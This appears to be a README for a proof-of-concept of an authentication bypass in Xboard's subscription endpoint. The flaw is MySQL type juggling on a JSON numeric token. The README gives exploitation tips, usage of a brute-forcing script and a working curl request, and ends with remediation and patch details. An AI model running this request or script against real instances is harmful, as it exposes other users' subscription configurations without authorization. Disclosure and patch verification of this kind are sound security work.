# Xboard Subscription Token Authentication Bypass PoC

> made by @pingzicloud1234

Affected versions: `cedar2025/Xboard` versions before commit `e68fec5`.

## How it works

The old `app/Http/Middleware/Client.php`:

```php
$token = $request->input('token', $request->route('token'));
if (empty($token)) { throw new ApiException('token is null', 403); }
$user = User::where('token', $token)->first();
```

`input()` does not validate the type. When the token is sent as a JSON **number**
in the request body, PHP receives an `int`. Since `users.token` is `CHAR(32)`,
MySQL converts the column value to a number before comparing:

```
'44155bc2...' = 44155   -> true
```

As a result, a number can match all tokens with that numeric prefix. `first()`
returns an arbitrary matching record, allowing the user's subscription to be
retrieved without the full token.

## Requirements

- The request body must be JSON, and the number must be **unquoted**.
  In a query string, `?token=2` is a string, so MySQL performs a string comparison
  and does not match.
- Do not try `token=0`: in the old code, `empty(0) === true`, so it immediately
  returns 403.
- The matching value is the token's **numeric prefix**: for `11xxxx`, try `11`,
  not `1`.

## Usage

```bash
./poc.sh -u https://example.com             # Try 1..99
./poc.sh -u https://example.com -n 999      # Expand the range
./poc.sh -u https://example.com -f singbox  # Change the subscription format
./poc.sh -u https://example.com -k -v       # Ignore certificate errors / show failed requests
```

A hit is reported as `VULNERABLE`, and responses are saved to `./out/`.
Instance-specific configuration, such as node details, appears only in the
output; the script is general-purpose and contains no instance-specific data.

Exit codes: `0` = vulnerable, `1` = no hits or already patched, `2` = invalid arguments.

## Manual verification

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X GET 'https://example.com/api/v1/client/subscribe' \
  -H 'Content-Type: application/json' \
  --data-raw '{"token":2,"flag":"clashmeta"}'
```

200 with configuration data = vulnerable; 403 = patched or no match.

## Remediation

- Upgrade to `e68fec5` or later. This commit adds `Helper::validateSubscriptionToken`,
  which accepts only 32-character hexadecimal tokens, prioritizes the route token,
  and otherwise reads the token only from the query string.
- After the fix, numeric token requests should all return 403, while valid
  32-character tokens should still return 200.
- Tokens may have been exposed; rotating them is recommended.
